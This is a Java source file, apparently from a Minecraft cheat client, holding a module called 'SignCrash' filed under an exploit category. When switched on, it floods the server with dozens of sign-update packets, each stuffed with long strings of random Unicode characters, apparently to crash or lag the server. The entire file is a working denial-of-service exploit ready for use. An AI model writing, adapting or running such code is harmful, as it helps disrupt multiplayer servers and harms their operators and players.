package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.Module;
import net.minecraft.network.play.client.CPacketCloseWindow;
import net.minecraft.network.play.client.CPacketUpdateSign;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.TextComponentBase;
import net.minecraft.util.text.TextComponentString;

import java.util.Random;

public class SignCrash extends Module {
    public SignCrash(){
        super("SignCrash" , Categories.EXPLOIT , false , false);
    }

    @Override
    public void onEnable(){
        if(nullCheck()) return;
        for (int i = 0; i < 38; i++) {
            ITextComponent[] components = new ITextComponent[]{
                    new TextComponentString(rndBinStr(598)) ,
                    new TextComponentString(rndBinStr(598)) ,
                    new TextComponentString(rndBinStr(598)) ,
                    new TextComponentString(rndBinStr(598))
            };

            CPacketUpdateSign p = new CPacketUpdateSign(mc.player.getPosition(), components);
            mc.player.connection.sendPacket(p);
        }
    }

    public static String rndBinStr(int size) {
        StringBuilder end = new StringBuilder();
        for (int i = 0; i < size; i++) {
            // 65+57
            end.append((char) (new Random().nextInt(0xFFFF)));
        }
        return end.toString();
    }
}
